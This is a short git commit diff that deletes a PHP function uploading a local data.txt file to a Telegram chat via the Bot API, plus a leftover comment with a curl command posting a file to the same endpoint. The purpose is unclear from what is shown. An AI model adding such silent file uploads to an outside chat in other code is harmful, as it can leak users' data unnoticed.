df6a5320aa0eba834b4387326bc84f4a5ba30917
intern-tester <115193630+intern-tester@users.noreply.github.com>
2022-10-07 10:04:54 +0300

    Update index.php

--- index.php
+++ index.php
@@ -42,33 +42,6 @@ return '
 ';
 }
 
-function sendDocument($document, $chatid){
-    CONST CHAT_ID = '~~';
-    CONST BOT = '~~';
-
-    CONST FILENAME = './data.txt';
-    // Create CURL object
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".BOT."/sendDocument?chat_id=" . CHAT_ID);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_POST, 1);
-
-    // Create CURLFile
-    $finfo = finfo_file(finfo_open(FILEINFO_MIME_TYPE), FILENAME);
-    $cFile = new CURLFile(FILENAME, $finfo);
-
-    // Add CURLFile to CURL request
-    curl_setopt($ch, CURLOPT_POSTFIELDS, [
-        "document" => $cFile
-    ]);
-
-    // Call
-    $result = curl_exec($ch);
-
-    // Show result and close curl
-    var_dump($result);
-    curl_close($ch);
-}
 
 //print 'Test Cathedra VAR % ' . $namesite; curl -F document=@"path/to/some.file" https://api.telegram.org/bot<token>/sendDocument?chat_id=<chat_id>
 
